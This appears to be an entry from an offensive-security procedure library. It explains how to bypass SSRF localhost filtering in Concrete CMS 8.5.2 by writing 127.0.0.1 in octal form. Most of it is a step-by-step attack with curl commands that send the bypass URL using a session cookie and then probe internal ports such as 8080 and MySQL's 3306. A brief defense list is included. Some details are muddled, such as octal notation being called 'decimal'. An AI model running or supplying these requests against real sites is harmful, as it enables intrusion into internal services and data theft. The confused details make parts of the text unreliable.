---
id: proc-uuid-863221
tags:
  - ssrf
  - bypass
  - decimal-ip
  - localhost
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.284Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass Localhost SSRF Restrictions with Decimal IP Notation

## Summary

This procedure exploits an SSRF vulnerability in Concrete CMS 8.5.2 by bypassing localhost access controls using decimal (octal) IP notation, such as 0177.0.0.1 for 127.0.0.1. It builds on a prior SSRF discovery and allows attackers to interact with internal services, leading to potential information disclosure or further pivoting.

## Description

In Concrete CMS, the URL fetching feature (used for importing files or proxying resources) includes SSRF protections that block direct localhost references like 127.0.0.1. However, validation fails to parse decimal notations, enabling bypass. The attack targets public-facing instances, requiring only basic access to the endpoint. Outcomes include accessing local metadata endpoints, database servers, or cloud instance metadata, with impact depending on exposed services (e.g., AWS IMDS at 169.254.169.254, but here focused on localhost ports).

## Requirements

1. Access to a Concrete CMS 8.5.2 instance with the vulnerable URL fetching feature
2. Knowledge of internal service ports (e.g., 8080 for a local app)
3. HTTP client like curl or browser for request submission
4. Optional: Valid session cookie if the endpoint requires authentication

## Defense

Defensive measures and detection strategies:

- Implement comprehensive URL validation parsing all IP notations (decimal, octal, hex)
- Use allowlists for permitted hosts instead of blocklists
- Monitor application logs for suspicious URL patterns like decimal IPs
- Deploy WAF rules to block non-standard IP formats in requests

## Objectives

1. Bypass SSRF localhost restrictions to reach internal endpoints
2. Interact with local services for reconnaissance or data exfiltration
3. Demonstrate potential for chainable exploits based on exposed internals

## Instructions

### Step 1: Confirm Existing SSRF and Restriction

**Context**: Verify the base SSRF vulnerability and its localhost block from the prior report (HackerOne #243865). Identify the exact endpoint, such as a file import or resource fetch in Concrete CMS.

Test a blocked request using curl:

```bash
curl -X POST 'https://target.com/concrete/path/to/fetch-endpoint' --data 'url=http://127.0.0.1:8080' -b 'PHPSESSID=your_session'
```

> This command submits a localhost URL to the fetch endpoint. Expect an error or denial due to the restriction, confirming the vulnerability's limits.

### Step 2: Execute Bypass with Decimal Notation

**Context**: Encode 127.0.0.1 as 0177.0.0.1 (octal-decimal) to evade string matching. Target an internal service on a known port.

Submit the bypassed URL:

```bash
curl -X POST 'https://target.com/concrete/path/to/fetch-endpoint' --data 'url=http://0177.0.0.1:8080/internal-path' -b 'PHPSESSID=your_session' -v
```

> The -v flag enables verbose output to inspect headers and responses. Success is indicated by content from the internal service, such as a banner or data leak, without triggering the localhost filter.

### Step 3: Validate Internal Access

**Context**: Probe multiple ports or paths to enumerate services.

Iterate with variations:

```bash
curl -X POST 'https://target.com/concrete/path/to/fetch-endpoint' --data 'url=http://0177.0.0.1:3306/mysql-version' -b 'PHPSESSID=your_session'
```

> Adjust ports (e.g., 3306 for MySQL) based on expected services. Look for database errors or version info as proof of access.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/curl]]

## Tags

- [[ssrf]]
- [[bypass]]
- [[concrete-cms]]
